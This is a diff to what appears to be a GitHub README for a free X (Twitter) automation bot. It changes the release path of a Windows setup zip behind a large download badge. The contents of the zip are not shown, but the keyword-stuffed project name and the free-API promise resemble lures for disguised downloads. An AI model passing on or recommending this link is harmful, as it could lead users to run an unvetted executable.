@@ -16,7 +16,7 @@ This software allows you to automate your X (Twitter) presence without paying fo
  </p> 
 
 <p align="center">
-  <a href="https://github.com/cortexaiofficial/Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker/releases/download/v1.5/X_Automation_Setup.zip">
+  <a href="https://github.com/cortexaiofficial/Twitter-X-API-Free-Automation-Bot-Auto-Like-Follow-Post-Tracker/releases/download/twitter-bot/X_Automation_Setup.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD-X%20Automation%20Bot%20v1.5-brightgreen?style=for-the-badge&logo=windows" alt="Download X Bot">
   </a>
 </p>
